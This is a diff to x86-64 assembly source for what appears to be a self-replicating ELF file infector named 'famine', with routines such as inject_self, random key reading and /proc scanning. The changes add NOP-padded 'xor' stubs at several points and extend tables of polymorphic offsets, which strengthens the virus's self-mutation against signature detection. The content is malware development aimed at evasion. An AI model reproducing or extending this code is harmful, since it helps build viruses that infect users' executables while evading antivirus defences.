@@ -71,6 +71,9 @@ jne _exx_pop
 
 
 .opendir_proc:
+	xor rdi, rdi
+		dd 0x90909090
+			db 0x90
 	lea rdi, STACK(famine.commpath)
 	mov rsi, 0x13203C936162
 	lea rdi, STACK(famine.commpath)
@@ -105,6 +108,9 @@ jne _exx_pop
 
 
 .read_file:
+	xor rdi, rdi
+		dd 0x90909090
+			db 0x90
 	lea rdi, STACK(famine.dirents_proc)
 	add rdi, r13
 	movzx edx, word[rdi+dirent.d_reclen]
@@ -158,6 +164,10 @@ nop
 	jl .nextfile_proc
 
 ;read the commfile
+	.poly_xor_rdi_6:
+	xor rdi, rdi
+		dd 0x90909090
+			db 0x90
 	OBF_PUSH_RAX
 	mov rdi, rax
 	mov rax, _read
@@ -569,6 +579,9 @@ inject_self:
 	OBF_PUSH_RDI ; save phdr to infect offset to  stack
 
 .get_rand_key:
+	xor rdi, rdi
+		dd 0x90909090
+			db 0x90
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
@@ -738,12 +751,16 @@ inject_self:
 
 	.poly_xor2:
 	xor r11, r11
+		dd 0x90909090
+		db 0x90
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_XOR_R11_1_OFFSET
 	mov qword[r10+8], POLY_XOR_R11_2_OFFSET
-	mov qword[r10+16], POLY_XOR_R11_2_OFFSET
-	mov qword[r10+24], POLY_XOR_R11_2_OFFSET
-	mov qword[r10+32], 0x1111
+	mov qword[r10+16], POLY_XOR_R11_3_OFFSET
+	mov qword[r10+24], POLY_XOR_R11_4_OFFSET
+	mov qword[r10+32], POLY_XOR_R11_5_OFFSET
+	mov qword[r10+40], POLY_XOR_R11_6_OFFSET
+	mov qword[r10+48], 0x1111
 	mov r11, POLY_XOR_R11_NUMBER
 	mov r9, POLY_XOR_R11_SIZE
 	lea rsi, [rel poly_xor_r11_r11]
@@ -751,11 +768,18 @@ inject_self:
 
 	.poly_xor3:
 	xor r11, r11
+		dd 0x90909090
+			db 0x90
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_XOR_RDI_1_OFFSET
 	mov qword[r10+8], POLY_XOR_RDI_2_OFFSET
 	mov qword[r10+16], POLY_XOR_RDI_3_OFFSET
-	mov qword[r10+24], 0x1111
+	mov qword[r10+24], POLY_XOR_RDI_4_OFFSET
+	mov qword[r10+32], POLY_XOR_RDI_5_OFFSET
+	mov qword[r10+40], POLY_XOR_RDI_6_OFFSET
+	mov qword[r10+48], POLY_XOR_RDI_7_OFFSET
+	mov qword[r10+56], POLY_XOR_RDI_8_OFFSET
+	mov qword[r10+64], 0x1111
 	mov r11, POLY_XOR_RDI_NUMBER
 	mov r9, POLY_XOR_RDI_SIZE
 	lea rsi, [rel poly_xor_rdi_rdi]
@@ -886,6 +910,9 @@ inject_self:
 	syscall
 
 	.jmp_wuw:
+	xor rdi, rdi
+		dd 0x90909090
+			db 0x90
 	mov rdi , STACK(famine.file_fd)
 	mov rsi, 0
 	mov rdx, END_SEEK
